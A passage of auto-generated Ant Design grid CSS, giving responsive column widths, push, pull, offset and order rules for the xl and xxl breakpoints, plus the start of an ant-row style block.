      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-17 {
        margin-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-17 {
        order: 17;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-16 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 66.66666666666666%;
        max-width: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-16 {
        inset-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-16 {
        inset-inline-end: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-16 {
        margin-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-16 {
        order: 16;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-15 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 62.5%;
        max-width: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-15 {
        inset-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-15 {
        inset-inline-end: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-15 {
        margin-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-15 {
        order: 15;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-14 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 58.333333333333336%;
        max-width: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-14 {
        inset-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-14 {
        inset-inline-end: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-14 {
        margin-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-14 {
        order: 14;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-13 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 54.166666666666664%;
        max-width: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-13 {
        inset-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-13 {
        inset-inline-end: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-13 {
        margin-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-13 {
        order: 13;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-12 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 50%;
        max-width: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-12 {
        inset-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-12 {
        inset-inline-end: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-12 {
        margin-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-12 {
        order: 12;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-11 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 45.83333333333333%;
        max-width: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-11 {
        inset-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-11 {
        inset-inline-end: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-11 {
        margin-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-11 {
        order: 11;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-10 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 41.66666666666667%;
        max-width: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-10 {
        inset-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-10 {
        inset-inline-end: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-10 {
        margin-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-10 {
        order: 10;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-9 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 37.5%;
        max-width: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-9 {
        inset-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-9 {
        inset-inline-end: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-9 {
        margin-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-9 {
        order: 9;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-8 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 33.33333333333333%;
        max-width: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-8 {
        inset-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-8 {
        inset-inline-end: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-8 {
        margin-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-8 {
        order: 8;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-7 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 29.166666666666668%;
        max-width: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-7 {
        inset-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-7 {
        inset-inline-end: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-7 {
        margin-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-7 {
        order: 7;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-6 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 25%;
        max-width: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-6 {
        inset-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-6 {
        inset-inline-end: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-6 {
        margin-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-6 {
        order: 6;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-5 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 20.833333333333336%;
        max-width: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-5 {
        inset-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-5 {
        inset-inline-end: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-5 {
        margin-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-5 {
        order: 5;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-4 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 16.666666666666664%;
        max-width: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-4 {
        inset-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-4 {
        inset-inline-end: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-4 {
        margin-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-4 {
        order: 4;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-3 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 12.5%;
        max-width: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-3 {
        inset-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-3 {
        inset-inline-end: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-3 {
        margin-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-3 {
        order: 3;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-2 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 8.333333333333332%;
        max-width: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-2 {
        inset-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-2 {
        inset-inline-end: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-2 {
        margin-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-2 {
        order: 2;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-1 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 4.166666666666666%;
        max-width: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-1 {
        inset-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-1 {
        inset-inline-end: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-1 {
        margin-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-1 {
        order: 1;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-0 {
        display: none;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-offset-0 {
        margin-inline-start: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-order-0 {
        order: 0;
      }
    }

    @media (min-width: 1600px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-24 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 100%;
        max-width: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-24 {
        inset-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-24 {
        inset-inline-end: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-24 {
        margin-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-24 {
        order: 24;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-23 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 95.83333333333334%;
        max-width: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-23 {
        inset-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-23 {
        inset-inline-end: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-23 {
        margin-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-23 {
        order: 23;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-22 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 91.66666666666666%;
        max-width: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-22 {
        inset-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-22 {
        inset-inline-end: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-22 {
        margin-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-22 {
        order: 22;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-21 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 87.5%;
        max-width: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-21 {
        inset-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-21 {
        inset-inline-end: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-21 {
        margin-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-21 {
        order: 21;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-20 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 83.33333333333334%;
        max-width: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-20 {
        inset-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-20 {
        inset-inline-end: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-20 {
        margin-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-20 {
        order: 20;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-19 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 79.16666666666666%;
        max-width: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-19 {
        inset-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-19 {
        inset-inline-end: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-19 {
        margin-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-19 {
        order: 19;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-18 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 75%;
        max-width: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-18 {
        inset-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-18 {
        inset-inline-end: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-18 {
        margin-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-18 {
        order: 18;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-17 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 70.83333333333334%;
        max-width: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-17 {
        inset-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-17 {
        inset-inline-end: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-17 {
        margin-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-17 {
        order: 17;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-16 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 66.66666666666666%;
        max-width: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-16 {
        inset-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-16 {
        inset-inline-end: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-16 {
        margin-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-16 {
        order: 16;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-15 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 62.5%;
        max-width: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-15 {
        inset-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-15 {
        inset-inline-end: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-15 {
        margin-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-15 {
        order: 15;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-14 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 58.333333333333336%;
        max-width: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-14 {
        inset-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-14 {
        inset-inline-end: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-14 {
        margin-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-14 {
        order: 14;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-13 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 54.166666666666664%;
        max-width: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-13 {
        inset-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-13 {
        inset-inline-end: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-13 {
        margin-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-13 {
        order: 13;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-12 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 50%;
        max-width: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-12 {
        inset-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-12 {
        inset-inline-end: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-12 {
        margin-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-12 {
        order: 12;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-11 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 45.83333333333333%;
        max-width: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-11 {
        inset-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-11 {
        inset-inline-end: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-11 {
        margin-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-11 {
        order: 11;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-10 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 41.66666666666667%;
        max-width: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-10 {
        inset-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-10 {
        inset-inline-end: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-10 {
        margin-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-10 {
        order: 10;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-9 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 37.5%;
        max-width: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-9 {
        inset-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-9 {
        inset-inline-end: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-9 {
        margin-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-9 {
        order: 9;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-8 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 33.33333333333333%;
        max-width: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-8 {
        inset-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-8 {
        inset-inline-end: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-8 {
        margin-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-8 {
        order: 8;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-7 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 29.166666666666668%;
        max-width: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-7 {
        inset-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-7 {
        inset-inline-end: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-7 {
        margin-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-7 {
        order: 7;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-6 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 25%;
        max-width: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-6 {
        inset-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-6 {
        inset-inline-end: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-6 {
        margin-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-6 {
        order: 6;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-5 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 20.833333333333336%;
        max-width: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-5 {
        inset-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-5 {
        inset-inline-end: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-5 {
        margin-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-5 {
        order: 5;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-4 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 16.666666666666664%;
        max-width: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-4 {
        inset-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-4 {
        inset-inline-end: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-4 {
        margin-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-4 {
        order: 4;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-3 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 12.5%;
        max-width: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-3 {
        inset-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-3 {
        inset-inline-end: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-3 {
        margin-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-3 {
        order: 3;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-2 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 8.333333333333332%;
        max-width: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-2 {
        inset-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-2 {
        inset-inline-end: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-2 {
        margin-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-2 {
        order: 2;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-1 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 4.166666666666666%;
        max-width: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-1 {
        inset-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-1 {
        inset-inline-end: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-1 {
        margin-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-1 {
        order: 1;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-0 {
        display: none;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-offset-0 {
        margin-inline-start: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-xxl-order-0 {
        order: 0;
      }
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1h1498m" data-token-hash="icxjto" data-cache-path="icxjto|Grid-Grid|ant-row|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"] [class^="ant-row"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] [class^="ant-row"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"] [class*=" ant-row"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] [class*=" ant-row"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"] [class^="ant-row"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] [class^="ant-row"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"] [class*=" ant-row"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] [class*=" ant-row"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"] [class^="ant-row"]::after,
